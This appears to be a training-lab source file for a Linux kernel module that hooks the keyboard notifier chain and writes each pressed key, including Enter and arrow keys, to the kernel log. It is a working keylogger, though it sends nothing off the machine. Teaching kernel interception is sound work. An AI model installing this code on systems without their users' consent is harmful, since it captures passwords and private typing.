/* 
 * LAB: Interception / Notifier chains / Log keystrokes
*/

#define pr_fmt(fmt) "%s: " fmt, KBUILD_MODNAME

#include <linux/module.h>
#include <linux/keyboard.h>

int init_function(void);
void exit_function (void);
module_init (init_function);
module_exit (exit_function);

MODULE_LICENSE("GPL"); // register_keyboard_notifier(), unregister_keyboard_notifier()
MODULE_AUTHOR("Kernel Ninjas LLC");
MODULE_DESCRIPTION("Log keystrokes");

// for debugging
char *action2string(unsigned long action) {
    switch (action) {
        case KBD_KEYCODE : return "KBD_KEYCODE";
        case KBD_UNBOUND_KEYCODE : return "KBD_UNBOUND_KEYCODE";
        case KBD_UNICODE : return "KBD_UNICODE";
        case KBD_KEYSYM : return "KBD_KEYSYM";
        case KBD_POST_KEYSYM : return "KBD_POST_KEYSYM";
        default : return "KBD_xxx";
    }
}

// for debugging
void display_keyboard_data(unsigned long action, struct keyboard_notifier_param *keyboard_param) {
    pr_info("value=0x%x(%u) [%s %s] action=%lx(%s)\n", 
        keyboard_param->value, 
        keyboard_param->value, 
        keyboard_param->down ? "DN" : "UP",
        keyboard_param->shift ? "SH" : "NS",
        action, action2string(action));
}

int keylogger_notifier_function (struct notifier_block *nb, unsigned long action, void *data);

static struct notifier_block keyboard_notifier_block = {
    .notifier_call = keylogger_notifier_function
};

bool install_keylogger(void) {

    // Step #1:
    // Register keylogger_notifier_function()
    // through the keyboard_notifier_block
    // into the keyboard notification chain 
    register_keyboard_notifier(&keyboard_notifier_block);
    return true;
}


int keylogger_notifier_function (struct notifier_block *nb, unsigned long action, void *data)
{
    struct keyboard_notifier_param *keyboard_param = data;

    // Step #2:
    // If the action is KBD_KEYSYM and it is key down event 
    // then process the keypress as follows:
    // - Perform special processing for ENTER, DOWN, LEFT, RIGHT, UP
    // - Extract the ASCII code from keyboard_notifier_param.value
    if (action == KBD_KEYSYM && keyboard_param->down) {
        unsigned char ascii_code = (unsigned char)keyboard_param->value & 0x00ff;
        switch (keyboard_param->value) {
            case 0xf201 : 
            pr_info("[ENTER] 0x%x (%u)\n", keyboard_param->value, keyboard_param->value ); 
            break;

            case 0xf600 : 
            pr_info("[DOWN] 0x%x (%u)\n", keyboard_param->value, keyboard_param->value ); 
            break;

            case 0xf601 : 
            pr_info("[LEFT] 0x%x (%u)\n", keyboard_param->value, keyboard_param->value ); 
            break;

            case 0xf602 : 
            pr_info("[RIGHT] 0x%x (%u)\n", keyboard_param->value, keyboard_param->value ); 
            break;

            case 0xf603 : 
            pr_info("[UP] 0x%x (%u)\n", keyboard_param->value, keyboard_param->value ); 
            break;

            default:
            if ( ( ascii_code >= ' ' ) && ( ascii_code <= 0x7c ) ) {
                pr_info("[%c] 0x%x (%u)\n", ascii_code, ascii_code, ascii_code );
            }
            break;
        }
    }

    // Step #3: 
    // Return the appropriate NOTIFY_XX value
    return NOTIFY_OK;
}

bool uninstall_keylogger(void) {
    // Step #4:
    // Deregister the keylogger_notifier_function()
    // through the keyboard_notifier_block from the keyboard notification chain 
    unregister_keyboard_notifier(&keyboard_notifier_block);
    return true;
}

int init_function(void) {

    pr_info("%s Built on %s %s\n", __func__, __DATE__, __TIME__ );

    install_keylogger();

    return 0;
} // init_function()

void exit_function (void) {

    uninstall_keylogger();

    pr_info("%s\n", __func__);
} // exit_function()

